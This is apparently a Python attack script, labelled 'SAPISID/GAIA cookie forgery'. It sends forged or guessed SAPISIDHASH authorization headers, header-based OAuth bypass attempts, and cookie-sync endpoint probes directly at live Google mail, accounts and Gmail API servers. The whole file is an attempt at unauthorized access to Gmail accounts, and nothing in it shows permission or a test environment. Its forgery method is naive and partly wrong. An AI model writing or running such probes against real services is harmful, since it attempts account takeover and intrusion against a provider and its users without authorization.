import requests, json, hashlib, hmac, base64, time

print('=== TRACK O: SAPISID/GAIA COOKIE FORGERY ===\n')

# 1. Test SAPISID hash forgery
print('1. SAPISID hash calculation')
origin = 'https://mail.google.com'
for guess in ['test', '1234567890', 'admin', 'user', 'guest']:
    hash_input = guess + ' ' + origin
    hash_bytes = hashlib.sha1(hash_input.encode()).digest()
    hash_b64 = base64.b64encode(hash_bytes).decode()
    headers = {
        'Authorization': f'SAPISIDHASH {int(time.time())}_{hash_b64}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Origin': origin
    }
    r = requests.get('https://mail.google.com/mail/u/0/', headers=headers, timeout=10)
    print(f'  SAPISID guess={guess}: HTTP {r.status_code} ({len(r.text)} bytes)')

print()
print('2. X-Same-Domain cookie bypass')
for header_val in ['1', 'true', 'same-origin']:
    r = requests.get('https://accounts.google.com/o/oauth2/auth',
                     headers={'X-Same-Domain': header_val},
                     params={'response_type': 'code', 'client_id': '77185425430.apps.googleusercontent.com', 'redirect_uri': 'http://localhost:5000/callback', 'scope': 'https://mail.google.com/'},
                     allow_redirects=False, timeout=10)
    loc = r.headers.get('Location', '')
    print(f'  X-Same-Domain={header_val}: HTTP {r.status_code} loc={loc[:80]}')

print()
print('3. Google cookie sync endpoint')
cookie_sync_urls = [
    'https://accounts.google.com/accounts/SetSID',
    'https://accounts.google.com/accounts/SetEmail',
    'https://accounts.google.com/accounts/SetOSID',
    'https://accounts.google.com/accounts/CookieSet',
]
for url in cookie_sync_urls:
    r = requests.get(url, timeout=10)
    print(f'  GET {url} -> HTTP {r.status_code} {r.text[:200]}')

print()
print('4. Google auth with additional headers')
additional_headers = [
    {'X-Goog-AuthUser': '0'},
    {'X-Goog-PageId': '0'},
    {'X-Goog-Encode-Response-If-Executable': '1'},
    {'X-Google-Apps-Metadata': '1'},
]
for hdr in additional_headers:
    key = list(hdr.keys())[0]
    r = requests.get('https://accounts.google.com/o/oauth2/auth',
                     headers=hdr,
                     params={'response_type': 'code', 'client_id': '77185425430.apps.googleusercontent.com', 'redirect_uri': 'http://localhost:5000/callback', 'scope': 'https://mail.google.com/'},
                     allow_redirects=False, timeout=10)
    print(f'  {key}={hdr[key]}: HTTP {r.status_code}')

print()
print('5. Gmail API with SAPISID auth')
r = requests.get('https://gmail.googleapis.com/gmail/v1/users/me/profile',
                 headers={'Authorization': 'SAPISIDHASH 0_test'},
                 timeout=10)
print(f'  HTTP {r.status_code} {r.text[:200]}')
